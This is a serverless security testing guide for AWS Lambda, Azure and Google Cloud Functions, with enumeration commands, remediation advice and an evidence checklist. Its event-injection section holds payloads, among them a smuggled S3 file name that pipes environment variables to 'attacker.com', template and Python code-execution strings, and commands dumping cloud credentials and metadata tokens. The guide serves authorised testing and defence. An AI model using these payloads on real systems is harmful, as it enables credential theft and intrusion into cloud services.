# Serverless Security Testing

## Overview
Serverless security testing targets vulnerabilities in cloud functions and event-driven architectures including AWS Lambda, Azure Functions, and Google Cloud Functions. Attack surfaces include event injection through untrusted triggers, environment variable leakage exposing secrets, cold start timing side channels, dependency confusion attacks, and overly permissive execution roles that enable privilege escalation.

## Classification
- **CWE:** CWE-94 (Improper Control of Generation of Code), CWE-200 (Exposure of Sensitive Information), CWE-269 (Improper Privilege Management)
- **OWASP:** A03:2021 - Injection, A05:2021 - Security Misconfiguration, A06:2021 - Vulnerable and Outdated Components
- **CVSS Base:** 5.0 - 9.8 (varies by attack vector)
- **MITRE ATT&CK:** T1059 (Command and Scripting Interpreter), T1190 (Exploit Public-Facing Application), T1525 (Implant Internal Image)

## Detection Methodology

### 1. AWS Lambda Security Assessment
```bash
# Enumerate all Lambda functions
aws lambda list-functions --query 'Functions[].{Name:FunctionName,Runtime:Runtime,Role:Role}'

# Get function configuration (includes env vars)
aws lambda get-function-configuration --function-name <name>

# Extract environment variables (may contain secrets)
aws lambda get-function-configuration --function-name <name> \
  --query 'Environment.Variables' --output json

# Download function code for analysis
aws lambda get-function --function-name <name> --query 'Code.Location' --output text | xargs curl -o function.zip

# Check function policy (resource-based policy)
aws lambda get-policy --function-name <name>

# Check execution role permissions
aws iam list-attached-role-policies --role-name <lambda-role>
aws iam list-role-policies --role-name <lambda-role>

# List event source mappings (triggers)
aws lambda list-event-source-mappings --function-name <name>

# List function URL configs (public endpoints)
aws lambda list-function-url-configs --function-name <name>

# Check layers for vulnerabilities
aws lambda list-layers
aws lambda get-layer-version --layer-name <name> --version-number <v>
```

### 2. Azure Functions Security Assessment
```bash
# List function apps
az functionapp list --query '[].{Name:name,Runtime:siteConfig.linuxFxVersion,RG:resourceGroup}'

# Get function app settings (may contain secrets)
az functionapp config appsettings list --name <app> --resource-group <rg>

# Check authentication settings
az functionapp auth show --name <app> --resource-group <rg>

# Check function keys (authorization)
az functionapp keys list --name <app> --resource-group <rg>
az functionapp function keys list --name <app> --resource-group <rg> --function-name <func>

# Check managed identity
az functionapp identity show --name <app> --resource-group <rg>

# Check network restrictions
az functionapp show --name <app> --resource-group <rg> \
  --query 'siteConfig.ipSecurityRestrictions'

# Download function code
az functionapp deployment source show --name <app> --resource-group <rg>
```

### 3. Google Cloud Functions Security Assessment
```bash
# List all Cloud Functions
gcloud functions list

# Describe a function (includes env vars and service account)
gcloud functions describe <function> --format=json

# Check environment variables
gcloud functions describe <function> --format='value(environmentVariables)'

# Check IAM policy on function
gcloud functions get-iam-policy <function>

# Check if function allows unauthenticated invocation
gcloud functions get-iam-policy <function> | grep allUsers

# Check the service account used by the function
gcloud functions describe <function> --format='value(serviceAccountEmail)'

# Download function source
gcloud functions describe <function> --format='value(sourceArchiveUrl)'
```

### 4. Event Injection Testing
```bash
# AWS Lambda — inject via API Gateway event
curl -X POST "https://<api-id>.execute-api.<region>.amazonaws.com/prod/<path>" \
  -H "Content-Type: application/json" \
  -d '{"key": "{{constructor.constructor('\''return this.process.env'\'')()}}"}'

# AWS Lambda — inject via S3 trigger (upload crafted filename)
aws s3 cp malicious.txt "s3://<trigger-bucket>/; curl attacker.com/$(env | base64)"

# AWS Lambda — inject via SQS message
aws sqs send-message --queue-url <url> \
  --message-body '{"data":"__import__(\"os\").popen(\"env\").read()"}'

# AWS Lambda — inject via SNS
aws sns publish --topic-arn <arn> \
  --message '{"default":"test","injection":"$(whoami)"}'

# Azure Functions — HTTP trigger injection
curl -X POST "https://<app>.azurewebsites.net/api/<function>?code=<key>" \
  -d '{"input":"{{7*7}}"}'

# GCP Cloud Functions — HTTP trigger injection
curl -X POST "https://<region>-<project>.cloudfunctions.net/<function>" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"__import__(\"os\").system(\"env\")"}'
```

### 5. Environment Variable and Secret Leakage
```bash
# From within a compromised function — dump runtime environment
# AWS Lambda
env | sort
cat /proc/self/environ | tr '\0' '\n'
echo $AWS_ACCESS_KEY_ID
echo $AWS_SECRET_ACCESS_KEY
echo $AWS_SESSION_TOKEN
echo $AWS_LAMBDA_FUNCTION_NAME

# Azure Functions
env | grep -i "AzureWebJobs\|FUNCTIONS_\|WEBSITE_\|MSI_\|IDENTITY_"

# GCP Cloud Functions
env | grep -i "GCLOUD\|GOOGLE\|GCP\|FUNCTION_"
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

### 6. Cold Start Timing Analysis
```bash
# Measure cold start vs warm start to detect function behavior
# Cold start (invoke after idle period)
for i in $(seq 1 20); do
  time curl -s -o /dev/null "https://<function-url>"
  sleep 60
done

# Warm start (rapid successive calls)
for i in $(seq 1 20); do
  time curl -s -o /dev/null "https://<function-url>"
done

# Timing difference may reveal:
# - Runtime/language used
# - Initialization logic
# - Secret loading patterns
# - Database connection setup
```

### 7. Dependency Confusion Testing
```bash
# Extract function dependencies from downloaded code
unzip function.zip -d function-source/
cat function-source/requirements.txt     # Python
cat function-source/package.json         # Node.js
cat function-source/go.mod               # Go

# Check for internal/private package names
# Look for packages that do not exist on public registries
pip install <suspected-internal-package> 2>&1 | grep "No matching distribution"
npm view <suspected-internal-package> 2>&1 | grep "404"

# Check for unpinned dependencies
grep -v "==" function-source/requirements.txt    # Python without pinning
grep -v '"~\|"\^' function-source/package.json   # Loose version ranges

# Scan dependencies for known vulnerabilities
pip-audit -r function-source/requirements.txt
npm audit --prefix function-source/
```

## Tool Usage

### ServerlessGoat (Practice Target)
```bash
# Deploy vulnerable serverless application for testing
# https://github.com/OWASP/Serverless-Goat
serverless deploy
```

### SLS-Dev-Tools
```bash
# Monitor Lambda invocations and CloudWatch logs
sls-dev-tools -n <function-name> -r <region>
```

### Nuclei
```bash
# Scan serverless endpoints
nuclei -u "https://<api-gateway-url>" -t http/ -batch
nuclei -u "https://<function-app>.azurewebsites.net" -t http/ -batch
```

### Manual Code Review Checklist
```
- Input validation on all event sources (API Gateway, S3, SQS, SNS, DynamoDB Streams)
- Secrets stored in environment variables vs. Secrets Manager/Key Vault
- Execution role permissions (should be minimal)
- Logging of sensitive data (PII, tokens in CloudWatch)
- Error handling that may leak stack traces
- Deserialization of untrusted input
- Temporary file usage in /tmp (persists across warm invocations)
```

## Remediation
1. **Input validation:** Validate and sanitize all event inputs regardless of source (API Gateway, S3, SQS, SNS, EventBridge), do not trust internal event sources
2. **Secrets management:** Use AWS Secrets Manager, Azure Key Vault, or GCP Secret Manager instead of environment variables for sensitive credentials
3. **Least privilege execution roles:** Scope function IAM roles to only the specific resources and actions needed, never use wildcard permissions
4. **Dependency security:** Pin all dependency versions, use lock files, run vulnerability scans in CI/CD, configure private package registries with scoped namespaces
5. **Function access control:** Disable public invocation unless required, use API Gateway authorizers, enforce authentication on HTTP triggers
6. **Logging and monitoring:** Enable function-level logging, alert on invocation anomalies, do not log sensitive data, set up dead-letter queues for failed invocations
7. **Temporary storage:** Treat /tmp as shared across warm invocations, clean up temporary files, do not store secrets in /tmp

## Evidence Collection
- Function configuration showing secrets in environment variables
- Event injection payloads and responses demonstrating code execution
- Downloaded function source code with identified vulnerabilities
- Execution role policy documents showing excessive permissions
- Dependency manifests with unpinned or vulnerable packages
- Cold start timing data showing exploitable patterns
- Resource-based policies allowing unauthorized invocation
